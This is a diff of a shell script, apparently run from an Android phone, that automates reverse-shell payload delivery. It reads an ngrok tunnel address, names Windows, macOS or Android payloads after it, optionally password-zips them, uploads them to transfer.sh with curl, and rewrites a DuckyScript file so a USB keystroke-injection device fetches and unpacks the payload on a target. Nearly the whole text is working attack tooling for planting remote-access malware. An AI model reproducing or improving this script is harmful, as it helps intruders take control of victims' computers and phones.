@@ -71,13 +71,14 @@ fi
 #Waiting for ngrok
 {
         i=0
-        while [ $i -ne 100 ]
+        while [ $i -ne 100 ] && [ -z $(grep '[^[:space:]]' $TEMPFILE) ]
         do
                 i=$(($i+1))
                 echo "$i"
-                sleep 0.03
+		echo "$(curl -s localhost:4040/api/tunnels | grep -Eo "(tcp)://[a-zA-Z0-9./?=_%:-]*" | sed "s#tcp://##g")" > $TEMPFILE
+                sleep 0.2
         done
-} | whiptail --backtitle "Vakandi Useful Tools" --title "Checking if the server is started and stable..." --gauge "Please wait until ngrok server has been checked" 8 50 0
+} | whiptail --backtitle "Vakandi Useful Tools" --title "Checking if the server is started and stable..." --gauge "Please wait until ngrok server has been checked, this windows will disapear automatically after the script found the ngrok server online & stable" 8 50 0
 #Waiting for ngrok
 if [ -z $(grep '[^[:space:]]' $TEMPFILE) ]; then
 	echo "\033[1;32m \nNGROK SERVER FAILED TO START..\nEXITING...\033[0m"
@@ -100,6 +101,10 @@ sleep 0.5
 echo "\033[1;33m:::: Type "m" for MACOSX(.app)\033[0m"
 sleep 0.5
 echo "\033[1;33m:::: Type "a" for ANDROID(.apk)\033[0m"
+
+
+
+
 read payload_choice
 if [ $payload_choice = "w" ]; then
 	echo "\033[1;34m:::: Creating the payload ::::\033[0m"
@@ -120,16 +125,31 @@ if [ $payload_choice != "a" ] && [ $payload_choice != "m" ] && [ $payload_choice
 	echo "\033[1;33mYou didn't choose one of the three formats\nQuitting now.. \033[0m"
 	exit
 fi
+
+#changing filename for m, w or a
+
+if [ $payload_choice = "w" ]; then
+	FILE=reverse$RANDOM-$(cat $TEMPFILE |sed "s#:#-port#g").exe
+fi
+if [ $payload_choice = "m" ]; then
+	FILE=reverse$RANDOM-$(cat $TEMPFILE |sed "s#:#-port#g").app
+fi
+if [ $payload_choice = "a" ]; then
+	FILE=reverse$RANDOM-$(cat $TEMPFILE |sed "s#:#-port#g").apk
+fi
+
+
+
 echo "\n::::Name of the payload:"
 echo "\033[1;32m $FILE  \033[0m"
 echo "::::Copying the payload in utiles/msf folder... :\n"
 cp ~/msf/temp/$FILE* /storage/emulated/0/utiles/msf/
-echo "\033[1;32m$(ls /storage/emulated/0/utiles/msf/$FILE*)\033[0m"
+echo "\033[1;32m$(ls /storage/emulated/0/utiles/msf/$FILE)\033[0m"
 
 echo "\033[1;33m\n:::: DO YOU WANT TO UPLOAD AND ENCRYPT YOUR PAYLOAD ON TRANSFER.SH? \n:::: Type "y" for UPLOAD\n:::: Type "yy" for UPLOAD & ENCRYPT\033[0m\033[1;32m(Alpha version soon)\033[0m\033[1;33m\n:::: or press ENTER for none of that\n\033[0m"
 read UPLOAD_choice
 if [ $UPLOAD_choice = "yy" ]; then
-	zip -e $ENCRYPTEDFILE $TEMP/$FILE*
+	zip -e $ENCRYPTEDFILE $TEMP/$FILE
 	echo "\033[1;32m:::: If you want a DuckyScript (only for Windows) please retype your password to update the .dd file, if not type "n"\nHERE (then press enter) ::: \033[0m"
 	read password
 	curl --upload-file $ENCRYPTEDFILE https://transfer.sh/reverse.zip > $LINKFILE
@@ -141,7 +161,7 @@ if [ $UPLOAD_choice = "yy" ]; then
 fi
 if [ $UPLOAD_choice = "y" ]; then
 	echo "\033[1;42m:::: Uploading the file into transfer.sh ... \033[0m"
-	zip $ARCHIVE $TEMP/$FILE*
+	zip $ARCHIVE $TEMP/$FILE
 	curl --upload-file $ARCHIVE https://transfer.sh/reverse.zip > $LINKFILE
 	echo "\033[1;34m\n:::: Creating the file link-****.txt in msf folder\n:::: The direct https link to the payload will be in it\033[0m"
 	echo "\033[1;42m::::DONE\033[0m"
@@ -156,7 +176,7 @@ else
 	echo "$(cat $DDFILEENCRYPTED | sed "s#$(cat $DDFILEENCRYPTED | grep -Eo 'http.*.exe' | cut -d' ' -f1)#$(cat $LINKFILE)#g")" > /storage/emulated/0/utiles/payload.dd
 	echo "::::The links have been changed"
 	echo "$(cat /storage/emulated/0/utiles/payload.dd | perl -p -e "s/PASSX/$password/")" > /storage/emulated/0/utiles/payload.dd
-	curl --upload-file ~/msf/temp/7.exe https://transfer.sh/7.exe > $LINK7ZIP
+	curl --upload-file $TEMP/7z.exe https://transfer.sh/7z.exe > $LINK7ZIP
 	echo "$(cat /storage/emulated/0/utiles/payload.dd | perl -p -e "s/7ZIPLINK/$LINK7ZIP/")" > /storage/emulated/0/utiles/payload.dd
 	echo "::::The archive password has been added to the .dd file (if you encrypt the payload)"
 fi
